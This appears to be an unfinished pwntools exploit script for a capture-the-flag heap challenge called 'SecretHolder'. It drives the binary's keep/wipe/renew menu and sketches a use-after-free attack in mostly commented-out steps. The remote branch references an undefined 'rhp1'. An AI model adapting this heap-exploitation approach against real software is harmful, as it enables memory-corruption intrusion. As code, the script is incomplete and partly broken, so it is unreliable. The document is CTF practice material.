#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./SecretHolder"

rhp2 = {'host':"localhost",'port':22222}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def keep(conn,_type,content):
  conn.recvuntil("Renew secret\n")
  conn.sendline("1")
  conn.recvuntil("Huge secret\n")
  conn.sendline(str(_type))
  conn.recvuntil(": \n")
  conn.send(content)

def wipe(conn,_type):
  conn.recvuntil("Renew secret\n")
  conn.sendline("2")
  conn.recvuntil("Huge secret\n")
  conn.sendline(str(_type))

def renew(conn,_type,content):
  conn.recvuntil("Renew secret\n")
  conn.sendline("3")
  conn.recvuntil("Huge secret\n")
  conn.sendline(str(_type))
  conn.recvuntil(": \n")
  conn.send(content)


off_arena96_stdout = 0x32de0

def exploit(conn):
  keep(conn,3,"A"*8)
  wipe(conn,3)
  
  keep(conn,3,"A"*8)

  #consume tcache
  #for i in range(8):
  #  keep(conn,1,"B"*8)
  #  wipe(conn,1)
  #                    #now s(x)==top
  #keep(conn,3,"C"*8)
#
#  keep(conn,2,"D"*8) #to avoid malloc_consolidate()
#  #realize UAF
#  wipe(conn,1) #now huge points to freed small chunk
#               #we have the access of 0x61a80 area from here
#  
  #renew(conn,3,p64(0xdeadbeef))
  #keep(conn,2,"E"*8)
  #wipe(conn,1)

  #keep(conn,2,"E"*8) #h(o)==s(x)==b(o) 0xfb1
  
  #keep(conn,1,"F"*8)
  #wipe(conn,1)
  
  #renew(conn,3,p64(0xdeadbeef))


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

